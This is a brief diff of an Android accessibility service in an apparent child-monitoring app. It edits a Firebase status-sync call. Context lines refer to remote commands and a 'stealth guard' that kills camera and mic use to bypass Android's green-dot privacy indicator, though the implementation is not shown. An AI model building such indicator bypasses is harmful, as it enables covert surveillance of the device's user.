@@ -637,7 +637,7 @@ class VyraAccessibilityService : AccessibilityService() {
 
         // 1. Sync device status and start listening to remote commands via Firebase
         val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
-        firebaseSync.syncDeviceStatus(batteryLevel = 84, isOnline = true)
+        firebaseSync.syncDeviceStatus(isOnline = true)
 
         // 2. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
         registerStealthScreenGuard()
